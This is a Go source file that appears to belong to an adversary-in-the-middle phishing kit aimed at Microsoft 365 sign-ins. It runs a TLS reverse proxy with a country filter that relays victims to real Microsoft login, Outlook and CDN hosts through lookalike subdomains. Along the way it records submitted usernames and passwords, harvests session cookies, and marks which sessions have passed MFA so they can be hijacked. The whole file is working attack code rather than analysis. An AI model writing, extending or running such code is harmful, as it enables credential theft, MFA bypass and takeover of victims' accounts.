package proxy

import (
	"bytes"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"o365/capture"
	"o365/configdb"
	"o365/inject"
	"o365/utils"
	"o365/ws"

	"github.com/rs/zerolog/log"
)

/* ───────── TLS listener ───────── */

func StartTLSIntercept(addr string, mux *http.ServeMux, cert tls.Certificate) error {
	tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", addr, tlsCfg)
	if err != nil {
		return err
	}

	filtered := utils.CountryFilter(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Local API endpoints
		if strings.HasPrefix(r.URL.Path, "/ws") ||
			strings.HasPrefix(r.URL.Path, "/login") ||
			strings.HasPrefix(r.URL.Path, "/submit") ||
			strings.HasPrefix(r.URL.Path, "/pass") ||
			strings.HasPrefix(r.URL.Path, "/cookie") ||
			strings.HasPrefix(r.URL.Path, "/2fa") ||
			strings.HasPrefix(r.URL.Path, "/sync") ||
			strings.HasPrefix(r.URL.Path, "/jscheck") ||
			strings.HasPrefix(r.URL.Path, "/track") {
			mux.ServeHTTP(w, r)
			return
		}
		InterceptHandler(w, r)
	}))

	return (&http.Server{Handler: filtered}).Serve(ln)
}

/* ───────── Core MITM proxy ───────── */

func InterceptHandler(w http.ResponseWriter, r *http.Request) {
	log.Info().
		Str("method", r.Method).
		Str("url", r.Host+r.URL.RequestURI()).
		Msg("Intercepting request")

	fixPostBack(r.URL)

	// helper to fetch the slug (ctx → ?key → cookie)
	getSlug := func() string {
		if s, _ := r.Context().Value("slug").(string); s != "" {
			return s
		}
		if s := r.URL.Query().Get("key"); s != "" {
			return s
		}
		if c, err := r.Cookie("o365_slug"); err == nil && c.Value != "" {
			return c.Value
		}
		return ""
	}

	/* ── duplicate body so it can be re-read ────────────── */
	var buf bytes.Buffer
	tee := io.TeeReader(r.Body, &buf)
	raw, _ := io.ReadAll(tee)
	r.Body = io.NopCloser(bytes.NewReader(raw))

	/* ── credential capture (POST /login) ──────────────── */
	var login string
	if r.Method == http.MethodPost && strings.Contains(r.URL.Path, "login") {
		_ = r.ParseForm()
		login, pass := r.FormValue("login"), r.FormValue("passwd")
		if login != "" && pass != "" {
			capture.SaveCreds(
				map[string]string{
					"login":  login,
					"passwd": pass,
					"slug":   getSlug(),
				},
				getRealIP(r),
			)
		}
	}

	/* ── slug landing page (/slug) ─────────────────────── */
	var slugStr string
	if seg := strings.Trim(r.URL.Path, "/"); seg != "" && !strings.Contains(seg, "/") {
		if uid, ok := configdb.IsValidSlug(seg); ok {
			slugStr = seg
			configdb.IncVisit(slugStr)

			// 🔐 Register for fallback even if WS is offline
			ws.RegisterSlug(slugStr, uid)

			r.URL.Path = "/"
			log.Info().Str("slug", slugStr).Str("user_id", uid).
				Msg("🎯 Valid slug hit")

			q := r.URL.Query()
			q.Set("key", slugStr)
			r.URL.RawQuery = q.Encode()
		}

	}

	/* ── build & fire upstream request ─────────────────── */
	up := upstreamFor(r.Host)
	target := "https://" + up + r.URL.RequestURI()

	req, err := http.NewRequest(r.Method, target, bytes.NewReader(raw))
	if err != nil {
		http.Error(w, "prep upstream failed", http.StatusInternalServerError)
		log.Error().Err(err).Msg("Failed to prepare upstream request")
		return
	}
	req.Header = r.Header.Clone()
	req.Host = up

	// fix wrongly scoped cookies for login.microsoft.com
	if strings.HasPrefix(up, "login.microsoft.com") {
		if ck := req.Header.Get("Cookie"); ck != "" {
			req.Header.Set("Cookie",
				strings.ReplaceAll(
					ck,
					"login.microsoft."+rootDomain(r.Host),
					"login.microsoft.com"))
		}
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil || resp == nil {
		http.Error(w, "upstream unreachable", http.StatusBadGateway)
		log.Error().Err(err).Msg("Upstream request failed")
		return
	}
	defer resp.Body.Close()

	/* ── successful session? ───────────────────────────── */
	// ── Detect successful session redirect ───────────────
	sessionValid := false
	if resp.Request != nil {
		finalURL := resp.Request.URL.String()
		log.Info().Str("redirect", finalURL).Msg("Final upstream URL")

		// 1️⃣  Any SAS step → mark MFA
		if strings.Contains(finalURL, "/SAS/") {
			if slug := getSlug(); slug != "" {
				if email := capture.GetLastSeenEmail(slug); email != "" {
					capture.SetAuthMethodFor(slug, email, "mfa")
				}
			}
		}

		// 2️⃣  Final success cues
		if strings.Contains(finalURL, "/SAS/ProcessAuth") || // after MFA
			strings.Contains(finalURL, "/kmsi") || // Keep-Me-Signed-In
			strings.Contains(finalURL, "PortalHome") || // Outlook / OWA
			strings.Contains(finalURL, "chat?auth") { // Teams chat landing

			sessionValid = true

			// persist flag ⇢ JSON
			if slug := getSlug(); slug != "" {
				if email := capture.GetLastSeenEmail(slug); email != "" {
					capture.SetSessionValidFor(slug, email)
				}
			} else if login != "" { // legacy
				capture.SetSessionValid(login)
			}

			log.Info().Msg("✅ Session marked VALID")
		}
	}

	/* ── cookie harvesting / HTML rewriting ────────────── */
	inject.TapMicrosoftAuthCookies(resp.Header)
	for _, sc := range resp.Header.Values("Set-Cookie") {
		entry := capture.ParseSetCookie(sc, time.Now())
		entry.Valid = sessionValid
		entry.Slug = getSlug()
		capture.SaveCookie(entry)
	}
	if login != "" && sessionValid {
		capture.SetSessionValid(login)
	}
	if !strings.HasPrefix(up, "login.microsoft.com") {
		inject.ProcessHTMLResponse(resp, r)
		inject.RewriteCookieDomains(resp.Header, strings.Split(r.Host, ":")[0])
	}

	/* remember slug for the browser (15 min) */
	if slugStr != "" {
		http.SetCookie(w, &http.Cookie{
			Name:     "o365_slug",
			Value:    slugStr,
			Path:     "/",
			MaxAge:   900,
			HttpOnly: true,
		})
	}

	/* ── relay upstream response ───────────────────────── */
	for k, vv := range resp.Header {
		for _, v := range vv {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, resp.Body)
}

/* ───────── helpers (unchanged from original) ───────── */

func getRealIP(r *http.Request) string {
	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
		return strings.Split(ip, ",")[0]
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

/* exact copy of the original mapping logic */
func upstreamFor(host string) string {
	host = strings.Split(host, ":")[0]
	root := rootDomain(host)
	prefix := strings.TrimSuffix(host, "."+root)

	switch prefix {
	case "login":
		return "login.microsoftonline.com"
	case "live", "login.live":
		return "login.live.com"
	case "account.live":
		return "account.live.com"
	case "outlook":
		return "outlook.office.com"
	case "token":
		return "token.microsoftonline.com"

	case "logincdn":
		return "logincdn.msauth.net"
	case "secure":
		return "secure.aadcdn.microsoftonline-p.com"
	case "aadcdn":
		return "aadcdn.msauth.net"
	case "aadcdn.msftauth":
		return "aadcdn.msftauth.net"
	case "aadcdn.msauth":
		return "aadcdn.msauth.net"

	case "login.microsoft":
		return "login.microsoft.com"
	case "token.microsoft":
		return "token.microsoft.com"
	case "outlook.microsoft":
		return "outlook.microsoft.com"
	case "logincdn.microsoft":
		return "logincdn.microsoft.com"
	case "secure.microsoft":
		return "secure.microsoft.com"
	case "aadcdn.microsoft":
		return "aadcdn.microsoft.com"
	case "aadcdn.msftauth.microsoft":
		return "aadcdn.msftauth.microsoft.com"
	case "account.microsoft":
		return "account.microsoft.com"
	case "outlook.office":
		return "outlook.office.com"
	}

	// Fallback: foo.bar.microsoftlogin.com → foo.microsoftonline.com
	first := strings.Split(prefix, ".")[0]
	log.Warn().Str("subdomain", prefix).Msg("Unmapped subdomain fallback")
	return first + ".microsoftonline.com"
}

func rootDomain(h string) string {
	p := strings.Split(h, ".")
	if len(p) < 3 {
		return h
	}
	return strings.Join(p[len(p)-2:], ".")
}
